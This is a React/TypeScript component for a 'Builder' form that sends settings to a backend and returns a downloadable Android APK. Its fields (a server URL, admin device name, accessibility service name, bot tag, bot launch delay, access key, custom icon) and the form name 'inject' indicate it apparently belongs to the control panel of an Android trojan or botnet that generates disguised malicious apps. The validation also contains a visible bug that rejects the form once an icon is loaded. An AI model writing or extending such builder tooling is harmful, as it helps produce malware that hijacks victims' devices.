import { useState, useContext } from "react";
import { Form, Input, Button, notification, Card, InputNumber, Select } from 'antd';
import { APKBuild } from "./services";
import FileInput from "../common/FileInput";
import { AppContext } from '../../providers';

const { Option } = Select

export default () => {
    const [apkBuild, setAPKBuild] = useState(false)
    const [loading, setLoading] = useState(false)
    const { appState, setAppState } = useContext(AppContext)

    const [state, setState] = useState({
        url: '',
        app: '',
        adminDevice: '',
        accessibilityName: '',
        botTag: '',
        launchBot: '1',
        accessKey: '',
        png: '',
        password: ''
    })

    const handlePNGFile = (e: any) => {
        try {
            let PNGFILE = e.target.files[0];

            if (PNGFILE.type === "image/png") {

                let reader = new FileReader();

                reader.readAsDataURL(PNGFILE);

                reader.onload = function (evt: any) {
                    let image = new Image();

                    image.src = evt.target.result;

                    image.onload = function () {
                        if (image.width >= 50 && image.height >= 50 && image.width <= 500 && image.height <= 500) {

                            setState((state: any) => {
                                return {
                                    ...state,
                                    png: evt.target.result.split(',')[1]
                                }
                            })

                            notification['success']({
                                message: 'success',
                                description: 'Load PNG file complete',
                            });
                        }
                        else {
                            notification['warning']({
                                message: 'warning',
                                description: 'Image minimum size 50x50px, max size 500x500px',
                            });
                        }
                    };
                };
                reader.onerror = function (evt) {
                    notification['error']({
                        message: 'error',
                        description: 'error reading file',
                    });
                };
            }
            else {
                notification['warning']({
                    message: 'warning',
                    description: 'Please select only PNG files',
                });
            }
        }
        catch (err: any) {
            notification['error']({
                message: 'error',
                description: err,
            });
        }
    }

    const build = () => {

        if (state.accessKey == '' || state.accessibilityName == '' || state.adminDevice == '' || state.app == '' || state.botTag == '' || state.password == '' || state.png) {
            notification.error({
                message: 'ERROR',
                description: 'Please input all informations!'
            })

            return
        }

        setLoading(true)
        setAPKBuild(false)

        APKBuild(state).then((res: any) => {
            if (res.toString().length < 10) {
                notification.error({
                    message: 'ERROR',
                    description: 'Session ended. Please refresh page!'
                })
                setLoading(false)

                return
            }

            notification['success']({
                message: 'success',
                description: 'The APK is generated successfully',
            });

            let element = document.getElementById('apkdownloadid');
            element?.setAttribute('href', 'data:application/vnd.android.package-archive;base64,' + res);
            let FileName = state.app + ' build.apk';
            element?.setAttribute('download', FileName);

            setAPKBuild(true)
            setLoading(false)
        })
    }

    return (
        <>
            <Card size="small" className='!rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
                <h2 className='text-center text-xl mt-4 mb-8 text-stone-400'>Builder</h2>
                <Form
                    name="inject"
                    labelCol={{ span: 8 }}
                    wrapperCol={{ span: 14 }}
                    initialValues={{
                        remember: true,
                    }}
                    onFinish={() => { }}
                    onFinishFailed={() => { }}
                    autoComplete="off"
                >
                    <Form.Item
                        label="Select URL"
                        name="url"
                    >
                        {
                            appState.globalSetting.urls.length ? (<Select
                                onChange={(v: string) => {
                                    setState((state: any) => {
                                        return {
                                            ...state,
                                            url: v
                                        }
                                    })
                                }}>
                                {
                                    appState.globalSetting.urls.map((url: string, i: number) => {
                                        return (<Option value={url} key={i}>{url}</Option>)
                                    })
                                }
                            </Select>
                            ) : (<Input placeholder='Select URL' onChange={(e: any) => {
                                setState((state: any) => {
                                    return {
                                        ...state,
                                        url: e.target.value
                                    }
                                })
                            }} />)
                        }
                        {/* <Input placeholder='Select URL'  /> */}
                    </Form.Item>

                    <Form.Item
                        label="Name Application"
                        name="nameapplication"
                        rules={[
                            {
                                required: true,
                                message: 'Please input name application.',
                            },
                        ]}
                    >
                        <Input placeholder='Name Application' onChange={(e: any) => {
                            setState((state: any) => {
                                return {
                                    ...state,
                                    app: e.target.value
                                }
                            })
                        }} />
                    </Form.Item>

                    <Form.Item
                        label="Admin Device"
                        name="admindevicename"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter admin device name.',
                            },
                        ]}
                    >
                        <Input placeholder='Admin Device Name' onChange={(e: any) => {
                            setState((state: any) => {
                                return {
                                    ...state,
                                    adminDevice: e.target.value
                                }
                            })
                        }} />
                    </Form.Item>

                    <Form.Item
                        label="Accessibility Name"
                        name="accessibilityname"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter accessibility name.',
                            },
                        ]}
                    >
                        <Input placeholder='Accessibility Name' onChange={(e: any) => {
                            setState((state: any) => {
                                return {
                                    ...state,
                                    accessibilityName: e.target.value
                                }
                            })
                        }} />
                    </Form.Item>

                    <Form.Item
                        label="Bot TAG"
                        name="bottag"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter bot tag.',
                            },
                        ]}
                    >
                        <Input placeholder='Bot TAG' onChange={(e: any) => {
                            setState((state: any) => {
                                return {
                                    ...state,
                                    botTag: e.target.value
                                }
                            })
                        }} />
                    </Form.Item>

                    <Form.Item
                        label="Launch bot"
                        name="launchbot"
                    >
                        <InputNumber className='!w-full' placeholder='Launch bot by activity [0 ~ 1500]' value={parseInt(state.launchBot)} min={0} max={1500} onChange={(e: number) => {
                            setState((state: any) => {
                                return {
                                    ...state,
                                    launchBot: e ? e.toString() : '0'
                                }
                            })
                        }} />
                    </Form.Item>

                    <Form.Item
                        label="Access Key"
                        name="accesskey"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter access key.',
                            },
                        ]}
                    >
                        <Input placeholder='Access Key' onChange={(e: any) => {
                            setState((state: any) => {
                                return {
                                    ...state,
                                    accessKey: e.target.value
                                }
                            })
                        }} />
                    </Form.Item>

                    <Form.Item
                        label="Select ICON (PNG)"
                        name="png"
                    >
                        <FileInput label="PNG File" onChange={handlePNGFile} />
                    </Form.Item>

                    <Form.Item
                        label="Password"
                        name="password"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter password.',
                            },
                        ]}
                    >
                        <Input placeholder='Password' onChange={(e: any) => {
                            setState((state: any) => {
                                return {
                                    ...state,
                                    password: e.target.value
                                }
                            })
                        }} />
                    </Form.Item>

                    <Form.Item
                        wrapperCol={{
                            offset: 8,
                            span: 16,
                        }}
                    >
                        <Button type="primary" htmlType="submit" ghost danger className="mr-2" onClick={build} loading={loading}>
                            Build APK
                        </Button>
                        <Button type="primary" ghost disabled={!apkBuild}>
                            <a href="#" id="apkdownloadid">Download APK</a>
                        </Button>
                    </Form.Item>
                </Form>
            </Card>
        </>
    );
};